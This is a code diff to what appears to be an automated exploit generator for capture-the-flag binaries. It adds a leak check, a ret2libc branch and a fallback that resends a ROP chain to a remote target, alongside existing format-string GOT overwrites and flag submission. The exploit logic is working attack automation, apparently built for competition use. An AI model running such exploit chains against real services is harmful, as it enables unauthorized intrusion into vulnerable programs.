@@ -53,6 +53,7 @@ class Aegis:
     def static_analysis(self):
         self.machine.check_mitigations()
         self.machine.check_vulnerable_input()
+        self.machine.check_leak()
         self.array_write = self.machine.check_array_write()
         printf_addrs = self.machine.check_vulnerable_printf()
 
@@ -71,7 +72,6 @@ class Aegis:
                 self.has_format = self.symbol.has_format 
 
     def setup_exploit(self):
-        
         self.against.chain = b""
 
         win_gadget = self.machine.find_win_gadget()
@@ -104,7 +104,6 @@ class Aegis:
                             got_addr = self.elf.got[self.got_targets[-1]]
                         else:
                             got_addr = self.elf.got["fflush"]
-
                         if function == "win":
                             self.against.format_write(self.elf.sym["win"], got_addr)
                             self.exploit()
@@ -135,6 +134,7 @@ class Aegis:
                         for got_entry in self.elf.got.keys():
                             if got_entry in bad_entries:
                                 continue
+                            aegis_log.debug(f"Writing to {got_entry}")
                             self.against.array_write(self.array_write, self.elf.got[got_entry])
                             self.exploit()
 
@@ -177,7 +177,11 @@ class Aegis:
                     aegis_log.debug(f"[{self.binary_name}] Setting up return to syscall with paramters {[59, hex(string)]}")
                 self.against.exploit = self.against.padding + self.against.chain
             else:
-                if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
+
+                if self.machine.leak == True:
+                    aegis_log.debug(f"[{self.binary_name}] Setting up ret2libc with given leak")
+
+                elif len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                     aegis_log.debug(f"[{self.binary_name}] Setting up return to puts")
                     self.against.chain = self.against.rop_ret2puts()
                 elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
@@ -231,6 +235,7 @@ class Aegis:
                 aegis_log.debug(f"[{self.binary_name}] Sending format string payload {self.against.format_exploit} {format_len % 16}")
 
         option = "GDB" if args.GDB else "" 
+        #option = "REMOTE"
 
         self.against.process = self.against.start(option)
         self.against.send_exploit()
@@ -238,8 +243,8 @@ class Aegis:
             aegis_log.debug(f"[{self.binary_name}] Adding ret to chain")
             ret = p64(self.rop.find_gadget(["ret"])[0])
             chain_len = len(self.against.chain)
+            original_chain = self.against.chain
             self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
-
             self.against.process = self.against.start(option)
             self.against.send_exploit()
             self.against.verify_flag()
@@ -250,7 +255,14 @@ class Aegis:
                 aegis_log.debug(f"[{self.binary_name}] Sent exploit to remote at {self.ip}")
                 if self.against.verify_flag() == True:
                     self.send_flag(self.against.remote_flag) 
-                                    
+                else:
+                    self.against.chain = original_chain
+                    self.against.process = self.against.start("REMOTE")
+                    self.against.send_exploit()                    
+                    aegis_log.debug(f"[{self.binary_name}] Sent exploit to remote at {self.ip} with original chain")
+                    if self.against.verify_flag() == True:
+                        self.send_flag(self.against.remote_flag) 
+                   
         else:
             if self.against.flag != None:
                 self.against.process = self.against.start("REMOTE")
